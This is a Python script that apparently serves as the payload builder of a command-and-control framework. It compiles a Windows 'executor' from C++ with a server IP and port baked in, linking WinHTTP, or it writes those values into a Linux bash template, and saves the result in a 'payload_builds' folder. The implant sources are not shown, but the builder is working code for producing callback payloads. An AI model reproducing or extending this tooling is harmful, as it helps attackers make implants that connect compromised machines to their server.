import os
import subprocess

BUILD_DIR = os.path.abspath("payload_builds")

def gen_executor(ip: str, port: int, arch: str, name: str, os_type: str = "win") -> None:
    if os_type.lower() == "win":
        arch = arch.lower()
        if arch == "x64":
            arch = "64"
        elif arch in ("x86", "x32"):
            arch = "32"
        else:
            print(f"Error: Invalid arch: {arch}")
            return

        vs_dev_cmd = None
        paths = [
            f"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\Community\\VC\\Auxiliary\\Build\\vcvars{arch}.bat",
            f"C:\\Program Files (x86)\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars{arch}.bat",
            f"C:\\Program Files\\Microsoft Visual Studio\\2019\\Community\\VC\\Auxiliary\\Build\\vcvars{arch}.bat",
            f"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\VC\\Auxiliary\\Build\\vcvars{arch}.bat",
        ]

        for path in paths:
            if os.path.isfile(path):
                vs_dev_cmd = path
                break

        if not vs_dev_cmd:
            print(f"Error: Could not find vcvars{arch}.bat")
            return

        cpp_file = os.path.abspath("./executors/win_executor/main.cpp")
        output_file = os.path.abspath(f"./{BUILD_DIR}/{name}.exe")

        cl_cmd = [
            "cl.exe",
            "/nologo",
            "/MT",
            cpp_file,
            "/EHsc",
            f"/D SERVER_IP=\\\"{ip}\\\"",
            f"/D SERVER_PORT={port}",
            "winhttp.lib",
            "user32.lib",
            f"/Fe{output_file}"
        ]

        full_cmd = f'call "{vs_dev_cmd}" && {' '.join(cl_cmd)}'

        print(f"Executing: {full_cmd}\n")

        p = subprocess.Popen(
            full_cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.DEVNULL,
        )
        stdout, stderr = p.communicate()

        if stdout:
            print("== STDOUT ==\n", stdout.decode(errors="ignore"))
        if stderr:
            print("== STDERR ==\n", stderr.decode(errors="ignore"))
    elif os_type.lower() == "linux":
        bash = os.path.abspath("./executors/linux_executor.sh")
        output_file = os.path.abspath(f"./{BUILD_DIR}/{name}.sh")

        with open(bash, "r") as f:
            lines = f.readlines()

        with open(output_file, "w") as f:
            for line in lines:
                if line.strip().startswith("IP="):
                    f.write(f'IP="{ip}"\n')
                elif line.strip().startswith("PORT="):
                    f.write(f'PORT={port}\n')
                else:
                    f.write(line)
        print(f"Linux executor generated: {output_file}")
    else:
        print(f"Error: Unsupported OS: {os_type}")
        return
